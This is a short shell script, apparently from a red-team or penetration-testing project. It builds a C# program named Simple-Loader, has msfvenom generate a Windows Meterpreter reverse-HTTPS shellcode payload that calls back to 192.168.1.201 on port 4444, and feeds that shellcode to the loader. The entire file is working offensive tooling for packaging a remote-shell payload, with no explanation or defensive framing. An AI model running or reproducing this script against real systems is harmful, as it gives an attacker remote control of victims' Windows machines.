#!/bin/sh
if [ ! -e Simple-Loader/bin/Release/Simple-Loader.exe ]; then
    msbuild /p:Configuration=Release
fi
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.201 LPORT=4444 -f csharp -o /tmp/payload.txt
mono Simple-Loader/bin/Release/Simple-Loader.exe /tmp/payload.txt
rm /tmp/payload.txt
